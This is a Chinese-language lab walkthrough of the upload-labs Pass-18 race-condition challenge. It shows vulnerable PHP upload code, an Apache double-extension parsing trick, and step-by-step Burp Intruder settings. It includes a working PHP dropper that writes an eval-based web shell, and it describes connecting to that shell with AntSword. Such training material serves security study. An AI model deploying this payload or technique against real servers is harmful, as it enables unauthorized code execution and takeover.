# 文件上传漏洞 - 条件竞争原理与绕过

## 一、条件竞争漏洞概述

### 1.1 漏洞前提条件

服务器会先将任意类型文件放在服务器上，然后再判断合法性，非法则删除

### 1.2 漏洞本质

抢夺线程的资源，使得我们上传的生成木马的文件可以被快速访问运行一次，达到非法目的

### 1.3 攻击原理

上传文件后，虽然小马会被立刻删除

但利用脚本不断访问生成的小马 PHP 文件，形成脚本和 Web 删除程序之间的竞争

一定的测试量后，可以竞争到资源，成功生成小马 PHP 文件执行 shell

## Pass-18：条件竞争绕过


```php
<?php
$is_upload = false;
$msg = null;

if (isset($_POST['submit'])) {
    $ext_arr = array('jpg', 'png', 'gif');
    $file_name = $_FILES['upload_file']['name'];
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $file_ext = substr($file_name, strrpos($file_name, '.') + 1);
    $upload_file = UPLOAD_PATH . '/' . $file_name;
    
    if (move_uploaded_file($temp_file, $upload_file)) {
        if (in_array($file_ext, $ext_arr)) {
            $img_path = UPLOAD_PATH . '/' . rand(10, 99) . date("YmdHis") . "." . $file_ext;
            rename($upload_file, $img_path);
            $is_upload = true;
        } else {
            $msg = "只允许上传.jpg|.png|.gif类型的文件";
            unlink($upload_file);
        }
    } else {
        $msg = '上传出错';
    }
}
?>
````


- 服务器先通过 `move_uploaded_file()` 保存文件
- 然后才检查文件扩展名是否合法
- 不合法则调用 `unlink()` 删除
- 存在时间窗口可以利用

### Apache 解析漏洞：

- `.7z` 后缀在白名单中

- 但 Apache 无法解析 `.7z`，会向前寻找可解析的后缀

- 因此 `2.php.7z` 会被当作 PHP 文件执行

- 注意：`.txt`、`.jpg` 等后缀不适用此方法

### 攻击步骤

#### Step 1：准备大马文件

上传 `2.php`，内容如下：
```php
<?php fputs(fopen('shell.php', 'w'), '<?php @eval($_POST["a"])?>');?>
```

#### Step 2：修改文件名

通过 Burp Suite 抓包，将文件名改为 `2.php.7z`

#### Step 3：配置 Intruder（上传端）

| 配置项             | 设置值                   |
| --------------- | --------------------- |
| Attack Type     | Sniper                |
| Payload Type    | Null payloads         |
| Payload Options | Continue indefinitely |
| Threads         | 20                    |
#### Step 4：配置 Intruder（访问端）

同时访问 `base_url + /upload/2.php.7z`，抓包发送至 Intruder，使用相同配置进行爆破。

#### Step 5：验证与连接

- 成功后服务器端会生成 `shell.php`
- 使用蚁剑访问 `base_url + /upload/shell.php` 连接即可
